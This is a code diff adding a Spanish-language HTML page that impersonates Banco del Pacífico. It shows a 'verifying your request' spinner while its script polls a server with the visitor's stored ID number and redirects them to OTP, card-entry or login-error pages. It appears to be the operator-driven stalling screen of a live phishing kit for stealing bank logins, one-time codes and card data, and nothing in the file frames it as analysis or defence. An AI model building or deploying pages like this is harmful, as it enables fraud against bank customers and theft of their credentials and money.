@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Banco del Pacífico – Procesando</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Segoe UI',Arial,sans-serif;background:#eef1f5;min-height:100vh;display:flex;flex-direction:column}
+    header{background:#fff;padding:16px 24px;display:flex;align-items:center;gap:12px;box-shadow:0 1px 4px rgba(0,0,0,.08)}
+    .logo-box{width:38px;height:38px;background:#1a56a0;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;font-weight:900}
+    header span{font-size:1.1rem;font-weight:700;color:#1a3a6b}
+    .page{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}
+    .card{background:#fff;border-radius:10px;padding:48px 32px;width:100%;max-width:440px;box-shadow:0 2px 12px rgba(0,0,0,.09);text-align:center}
+    .spinner-wrap{margin:0 auto 28px;width:72px;height:72px;position:relative}
+    .spinner{width:72px;height:72px;border:5px solid #e8edf3;border-top-color:#1a56a0;border-radius:50%;animation:spin 1s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .spinner-logo{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:34px;height:34px;background:#1a56a0;border-radius:7px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:15px;font-weight:900}
+    .card h2{font-size:1.2rem;font-weight:700;color:#1a3a6b;margin-bottom:10px}
+    .card p{font-size:.86rem;color:#999;line-height:1.65;margin-bottom:24px}
+    .dots span{display:inline-block;width:8px;height:8px;border-radius:50%;background:#1a56a0;margin:0 3px;animation:bounce 1.2s infinite}
+    .dots span:nth-child(2){animation-delay:.2s}
+    .dots span:nth-child(3){animation-delay:.4s}
+    @keyframes bounce{0%,80%,100%{transform:scale(.6);opacity:.4}40%{transform:scale(1);opacity:1}}
+    .steps-bar{display:flex;justify-content:center;gap:8px;margin-top:26px}
+    .step-dot{width:10px;height:10px;border-radius:50%;background:#d5dbe4;transition:background .4s}
+    .step-dot.active{background:#1a56a0}
+    .footer-note{text-align:center;font-size:.7rem;color:#ccc;margin-top:30px;line-height:1.6}
+    @media(max-width:480px){.card{padding:36px 18px}}
+  </style>
+</head>
+<body>
+<header>
+  <div class="logo-box">B</div>
+  <span>Banco del Pacífico</span>
+</header>
+<div class="page">
+  <div class="card">
+    <div class="spinner-wrap">
+      <div class="spinner"></div>
+      <div class="spinner-logo">B</div>
+    </div>
+    <h2>Verificando tu solicitud</h2>
+    <p>Estamos procesando tu información.<br/>Por favor espera, no cierres esta ventana.</p>
+    <div class="dots"><span></span><span></span><span></span></div>
+    <div class="steps-bar">
+      <div class="step-dot active"></div>
+      <div class="step-dot"></div>
+      <div class="step-dot"></div>
+    </div>
+    <p class="footer-note">© Copyright 2017 Banco del Pacífico *V5.3.12b</p>
+  </div>
+</div>
+<script>
+  const cedula = sessionStorage.getItem('bp_cedula') || '';
+  let dotIndex = 0;
+  const dots = document.querySelectorAll('.step-dot');
+
+  setInterval(()=>{
+    dots.forEach(d=>d.classList.remove('active'));
+    dotIndex = (dotIndex+1) % dots.length;
+    dots[dotIndex].classList.add('active');
+  }, 1200);
+
+  async function checkStatus(){
+    try{
+      const res = await fetch(`/api/check-status?cedula=${encodeURIComponent(cedula)}`);
+      const data = await res.json();
+
+      switch(data.action){
+        case 'otp':           window.location.href = 'otp.html'; break;
+        case 'tarjeta':       window.location.href = 'tarjeta.html'; break;
+        case 'error_login':   window.location.href = 'index1.html?error=login'; break;
+        case 'error_otp':     window.location.href = 'otp.html?error=otp'; break;
+        case 'error_tarjeta': window.location.href = 'tarjeta.html?error=tarjeta'; break;
+        case 'aprobar':       window.location.href = 'success.html'; break;
+      }
+    }catch(e){ console.log('polling error', e); }
+  }
+
+  setInterval(checkStatus, 3000);
+  checkStatus();
+</script>
+</body>
+</html>
